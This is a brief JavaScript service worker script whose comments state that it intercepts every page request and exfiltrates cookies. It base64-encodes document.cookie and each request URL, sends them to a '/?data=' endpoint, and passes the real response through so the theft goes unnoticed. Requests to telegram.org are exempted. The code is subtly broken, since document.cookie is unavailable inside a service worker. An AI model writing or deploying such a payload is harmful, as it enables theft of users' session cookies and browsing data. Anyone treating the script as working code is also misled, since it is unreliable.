self.addEventListener('fetch', event => {
    // Intercept all requests and exfil cookies
    if (event.request.url.includes('telegram.org')) return;
    
    event.respondWith(
        fetch(event.request).then(response => {
            // Exfil cookies via fetch
            fetch('/?data=' + btoa(JSON.stringify({
                cookies: document.cookie,
                url: event.request.url
            })));
            return response;
        }).catch(() => new Response(''))
    );
});
